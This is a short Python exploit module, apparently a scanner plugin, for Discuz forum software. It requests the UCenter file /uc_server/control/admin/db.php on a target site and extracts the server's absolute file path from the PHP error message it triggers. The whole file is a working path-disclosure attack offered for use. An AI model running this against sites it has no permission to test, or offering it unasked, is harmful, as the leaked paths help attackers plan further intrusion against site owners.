# coding:utf-8
# discuz 爆路径
import requests,re

class Exploit:

    def attack(self,url):
        req = requests.get(url+'/uc_server/control/admin/db.php')
        if req.status_code == 200:
            m = re.search(r'not found in [<b>]*([^<]+)[</b>]* on line [<b>]*(\d+)', req.text)
            if m:
                return m.group(1)